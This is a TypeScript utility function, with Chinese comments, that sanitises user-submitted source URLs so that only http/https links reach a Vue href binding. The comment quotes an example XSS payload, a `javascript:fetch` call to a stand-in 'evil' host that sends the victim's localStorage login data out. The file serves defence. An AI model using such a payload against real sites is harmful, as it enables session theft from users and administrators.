/**
 * 规范化用户提交的「来源链接」，只允许 http/https。
 *
 * 为什么需要：文章与文档的 `source_url` 会被前端直接绑到 `<a :href="...">`，
 * 而 Vue 不会净化 href —— 有发文权限的用户可以提交 `javascript:fetch('//evil/?'+localStorage.user)`，
 * 任何点击该链接的人（包括管理员）登录态即被窃取；本项目登录 token 存在 localStorage 且有效期很长。
 * `target="_blank"` 上的 `rel="noopener"` 只防 window.opener，对 `javascript:` 无效。
 *
 * 规则：非 http/https 协议、无法解析、空值，一律返回空字符串（前端 `v-if` 会隐藏该链接）。
 */
export function sanitizeHttpUrl(raw: unknown): string {
  const s = String(raw ?? '').trim();
  if (!s) return '';
  let parsed: URL;
  try {
    parsed = new URL(s);
  } catch {
    return '';
  }
  return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? s : '';
}
